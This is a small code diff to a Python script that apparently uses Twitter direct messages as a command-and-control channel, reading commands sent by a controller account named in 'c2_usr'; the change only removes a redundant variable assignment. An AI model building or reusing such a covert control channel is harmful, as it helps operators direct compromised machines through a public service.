@@ -15,7 +15,7 @@ c2_usr = ''
 auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
 auth.set_access_token(access_token, access_token_secret)
 api = tweepy.API(auth)
-userid = dms = re.findall(r'(?<=u\'id\': )[0-9]+', str(api.get_user(c2_usr)))[0]
+userid = re.findall(r'(?<=u\'id\': )[0-9]+', str(api.get_user(c2_usr)))[0]
 
 def get_command(api, lastcommand):
     raw_dms = api.direct_messages()
